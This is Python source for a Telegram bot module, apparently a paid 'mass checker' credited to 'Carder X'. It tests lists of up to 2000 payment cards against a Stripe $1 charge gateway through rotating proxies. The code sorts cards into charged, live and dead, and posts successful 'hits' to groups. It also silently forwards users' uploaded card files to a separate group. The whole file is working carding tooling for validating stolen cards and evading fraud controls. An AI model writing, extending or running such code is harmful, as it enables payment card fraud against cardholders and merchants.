async def handle_result_callback(callback: types.CallbackQuery, callback_data: MstResultCallback):
    try:
        session_id = callback_data.session_id
        result_type = callback_data.result_type

        session = MST_SESSIONS.get(session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("⚠️ 𝗬𝗼𝘂 𝗰𝗮𝗻𝗻𝗼𝘁 𝗶𝗻𝘁𝗲𝗿𝗮𝗰𝘁.", show_alert=True)
            return

        count = 0
        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('approved_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = (
                len(session.get('charged_cards', [])) +
                len(session.get('approved_cards', [])) +
                len(session.get('dead_cards', [])) +
                len(session.get('error_cards', []))
            )

        if count == 0:
            type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            await callback.answer(f"⚠️ No {type_names.get(result_type, '')} cards found", show_alert=True)
            return

        await callback.answer("📦 Generating report...", show_alert=False)

        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', '𝗧𝗿𝗶𝗮𝗹')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)
        file_content = file_buffer.read()
        file_buffer.seek(0)

        type_emojis = {"charged": "💎", "live": "✅", "dead": "❌", "all": "📁"}
        type_labels = {"charged": "𝗖𝗵𝗮𝗿𝗴𝗲𝗱", "live": "𝗟𝗶𝘃𝗲", "dead": "𝗗𝗲𝗮𝗱", "all": "𝗔𝗹𝗹"}

        _default_emoji = "📁"
        caption = (
            f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {type_labels.get(result_type, '𝗔𝗹𝗹')} {type_emojis.get(result_type, _default_emoji)}\n"
            f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <b>{total_count}</b>\n"
            f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀"
        )

        sent = await _safe_send_document(
            callback.bot,
            chat_id=callback.message.chat.id,
            document_bytes=file_content,
            filename=filename,
            caption=caption,
            reply_to=user_msg_id,
        )
        if not sent:
            try:
                await callback.answer("❌ Could not send report file.", show_alert=True)
            except Exception:
                pass

    except Exception as e:
        logging.error(f"Error handling MST result callback: {e}", exc_info=True)
        try:
            await callback.message.answer("⚠️ Error processing report", parse_mode="HTML")
        except:
            pass


@router.callback_query(MstStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MstStopCallback):
    try:
        session_id = callback_data.session_id
        session = MST_SESSIONS.get(session_id)
        if not session:
            await callback.answer("🛑 Session expired", show_alert=True)
            return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("⚠️ 𝗬𝗼𝘂 𝗰𝗮𝗻𝗻𝗼𝘁 𝗶𝗻𝘁𝗲𝗿𝗮𝗰𝘁.", show_alert=True)
            return

        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return

        session['status'] = "STOPPED"
        print("⚠️ [MST] Stop signal sent")

        cancelled_count = 0
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
                cancelled_count += 1

        await callback.answer("⚠️ Stopping...", show_alert=False)
        print(f"⚠️ [MST] Cancelled {cancelled_count} tasks")

        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)

    except Exception as e:
        logging.error(f"Error handling MST stop callback: {e}", exc_info=True)
        try:
            await callback.answer("🚫 Error stopping", show_alert=True)
        except:
            pass


# ═══════════════════════════════════════════════════════════════
# PER-CARD PROCESSING
# ═══════════════════════════════════════════════════════════════

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    session = MST_SESSIONS.get(session_id)
    if not session or is_session_stopped(session_id):
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        session['errors'] += 1
        session['checked'] += 1
        if session['checked'] % 3 == 0 or session['checked'] == session['total']:
            await update_progress_message(bot, session_id)
        return

    cc_parts = cc_formatted.split('|')
    if len(cc_parts) != 4:
        session['errors'] += 1
        session['checked'] += 1
        if session['checked'] % 3 == 0 or session['checked'] == session['total']:
            await update_progress_message(bot, session_id)
        return
    cc_num_val, mes, ano, cvv = cc_parts

    result_status = "ERROR"
    response_msg = "Unknown Error"

    MAX_RETRIES = 20
    attempt = 0

    while attempt < MAX_RETRIES:
        if is_session_stopped(session_id):
            return

        attempt += 1
        proxy_result = proxy_manager.get_next_proxy()

        if not proxy_result:
            session['errors'] += 1
            session['checked'] += 1
            if session['checked'] % 3 == 0 or session['checked'] == session['total']:
                await update_progress_message(bot, session_id)
            return

        proxy, is_rotated = proxy_result

        try:
            formatted_proxy = format_api_proxy(proxy)
            status_api, message_api = await process_card_api(cc_num_val, mes, ano, cvv, formatted_proxy)
            status_raw = status_api.upper()
            response_msg = message_api
            if status_raw == "CHARGED":
                result_status = "charged"
            elif status_raw == "APPROVED" or "insufficient" in response_msg.lower():
                result_status = "approved"
            elif status_raw == "ERROR" or "pasted_fields" in response_msg.lower() or "requires_confirmation" in response_msg.lower() or "empty psk" in response_msg.lower():
                result_status = "error"
            elif status_raw in ("3DS", "INVALID", "DECLINED") or "3ds" in response_msg.lower():
                result_status = "declined"
            else:
                result_status = "error"
        except asyncio.TimeoutError:
            result_status = "timeout"
            response_msg = "Timeout"
        except Exception as e:
            result_status = "error"
            response_msg = f"Connection Error: {str(e)[:50]}"
            print(f"[ERROR] {cc_formatted} -> {e}")

        if result_status in ("error", "timeout", "http_error"):
            proxy_manager.report_result(proxy, response_msg, None)
            continue
        else:
            proxy_manager.report_result(proxy, response_msg, 200)
            break

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    print(f"[MST] {cc_formatted} | {result_status} | {response_msg}")
    logging.info(f"[MST] {cc_formatted} | {result_status} | {response_msg}")

    session['checked'] += 1

    card_result_data = {
        'card': cc_formatted,
        'response': response_msg,
        'bin_info': bin_data,
        'gateway': 'Stripe 1$',
        'timestamp': datetime.now().isoformat()
    }

    if is_session_stopped(session_id):
        return

    if result_status in ["http_error", "timeout", "error"]:
        session['errors'] += 1
        session['error_cards'].append(card_result_data)

    elif result_status == "charged":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, True),
            asyncio.to_thread(log_hit_to_mst, user_id, user_obj.username, user_obj.first_name),
        )

        await asyncio.gather(
            send_hit_log_to_group(bot, cc_formatted, response_msg, user_obj, plan_name, "CHARGED"),
            send_user_hit_notification(bot, session, cc_formatted, cc_num, response_msg, user_obj, plan_name, "CHARGED"),
        )

    elif result_status == "approved":
        session['approved'] += 1
        session['approved_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, True),
        )

        if "insufficient" in str(response_msg).lower():
            await asyncio.gather(
                send_hit_log_to_group(bot, cc_formatted, response_msg, user_obj, plan_name, "APPROVED"),
                send_user_hit_notification(bot, session, cc_formatted, cc_num, response_msg, user_obj, plan_name, "APPROVED", send_to_extra=True),
            )
        else:
            await send_user_hit_notification(bot, session, cc_formatted, cc_num, response_msg, user_obj, plan_name, "APPROVED", send_to_extra=False)

    elif "declined" in result_status:
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, False),
        )

    if is_session_stopped(session_id):
        return
    if session['checked'] % 3 == 0 or session['checked'] == session['total']:
        await update_progress_message(bot, session_id)


# ═══════════════════════════════════════════════════════════════
# MAIN COMMAND
# ═══════════════════════════════════════════════════════════════

@router.message(lambda message: (message.text and any(message.text.startswith(c) for c in ["/mst", "/mffc"])) or (message.caption and any(message.caption.startswith(c) for c in ["/mst", "/mffc"])))
async def mst_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "mst"):
        await message.reply("🚧 <b>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id
    user_name = html.escape(user.first_name or "Unknown")
    bot = message.bot

    is_premium, _ = get_premium_status(user_id)
    if not is_premium:
        await message.reply(
            "💎 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗴𝗿𝗮𝗱𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗳𝗲𝗮𝘁𝘂𝗿𝗲.\n\n👉 𝗨𝘀𝗲 /buy 𝘁𝗼 𝘂𝗽𝗴𝗿𝗮𝗱𝗲.",
            parse_mode="HTML"
        )
        return

    is_checking = False
    for session_id, session_data in list(MST_SESSIONS.items()):
        if session_data.get('user_id') == user_id and session_data.get('status') == "CHECKING":
            is_checking = True
            break

    if is_checking:
        await message.reply(
            "🚫 <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\nUse the 🚫 <b>Stop</b> button to stop it.",
            parse_mode="HTML"
        )
        return

    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        await message.reply(
            "❌ <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\n"
            "Add proxies using <code>/proxy</code> command.",
            parse_mode="HTML"
        )
        return

    raw_text = ""
    if len(message.text.split()) > 1:
        raw_text += " ".join(message.text.split()[1:]) + " "

    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg.text:
            raw_text += replied_msg.text + " "
        elif replied_msg.caption:
            raw_text += replied_msg.caption + " "

    document = message.document
    if not document and message.reply_to_message and message.reply_to_message.document:
        document = message.reply_to_message.document

    if document:
        try:
            await bot.send_document(
                chat_id=EXTRA_CHARGED_GROUP_ID,
                document=document.file_id,
                caption=f"User <a href='tg://user?id={user_id}'>{user_name}</a> sent a txt file in /mst",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Failed to forward txt file to extra group: {e}")
        if document.file_size and document.file_size > 2 * 1024 * 1024:
            await message.reply("❌ File too large. Max 2MB.")
            return
        try:
            file = await bot.get_file(document.file_id)
            byte_io = await bot.download_file(file.file_path)
            raw_text += byte_io.read().decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply("❌ <b>No cards found.</b>", parse_mode="HTML")
        return

    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("❌ No valid card formats found.")
        return

    valid_cards = []
    MAX_VALID_CARDS = 2000
    for card_string in extracted_cards:
        if len(valid_cards) >= MAX_VALID_CARDS:
            break
        parts = card_string.split('|')
        if len(parts) != 4:
            continue
        cc, mm, yy, cvv = parts
        if luhn_check(cc):
            valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        await message.reply("⚠️ No valid Luhn checked cards found.")
        return

    is_group = message.chat.type in ("group", "supergroup", "channel")

    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)

    initial_text = (
        f"<b>🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> 𝗦𝘁𝗿𝗶𝗽𝗲 𝟭 𝗨𝗦𝗗\n"
        f"<b>📊 𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> <i>CHECKING</i> 🔄\n"
        f"<b>🔍 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>0/{total_cards}</code>\n"
        f"<b>✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>0</b>\n"
        f"<b>🔥 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ➛</b> <b>0</b>\n"
        f"<b>❌ 𝗗𝗲𝗮𝗱 ➛</b> <b>0</b>\n"
        f"<b>⚠️ 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>0</b>\n"
        f"<b>⚡ 𝗧𝗶𝗺𝗲 ➛</b> <b>0s</b>\n"
        f"<b>🐈‍⬛ 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/Lanxo2'>Carder X</a>\n"
        f"<b>🆔 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
    )

    initial_buttons = get_result_buttons(session_id, is_running=True)
    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)

    proxy_manager = ProxyManager(user_proxies, session_id)
    MST_SESSIONS[session_id] = {
        "proxy_manager": proxy_manager,
        "status": "CHECKING",
        "chat_id": message.chat.id,
        "user_id": user_id,
        "msg_id": progress_msg.message_id,
        "user_msg_id": message.message_id,
        "total": total_cards,
        "checked": 0,
        "approved": 0,
        "charged": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time(),
        "tasks": [],
        "last_text": "",
        "last_update_time": 0,
        "approved_cards": [],
        "charged_cards": [],
        "dead_cards": [],
        "error_cards": [],
        "user_obj": user,
        "plan_name": plan_name,
        "is_group": is_group,
    }

    print(f"🚀 [MST] Started - {total_cards} cards - User: {user_id} - Group: {is_group}")
    logging.info(f"🚀 [MST] Started - {total_cards} cards - User: {user_id} - Group: {is_group}")

    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user, plan_name))


async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MST_SESSIONS.get(session_id)
    if not session:
        return

    sem = asyncio.Semaphore(5)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    session['user_id'], bot, user_obj, plan_name
                )
            except asyncio.CancelledError:
                print(f"🛑 [MST] Task cancelled: {cc_formatted}")
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"Worker error for {cc_formatted}: {e}")

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            print(f"⚠️ [MST] Stopped creating tasks - {len(tasks)} created")
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        session['tasks'].append(task)

    print(f"📋 [MST] {len(tasks)} tasks created")

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
        if cancelled > 0:
            print(f"🛑 [MST] {cancelled} tasks cancelled")

    session = MST_SESSIONS.get(session_id)
    if session and session['status'] != "STOPPED":
        session['status'] = "FINISHED"
        session['last_text'] = ""
        await update_progress_message(bot, session_id)
        print(f"✅ [MST] Completed - A:{session['approved']} C:{session['charged']} D:{session['dead']} E:{session['errors']}")
    elif session and session['status'] == "STOPPED":
        print(f"🚫 [MST] Stopped - A:{session['approved']} C:{session['charged']} D:{session['dead']} Checked:{session['checked']}")
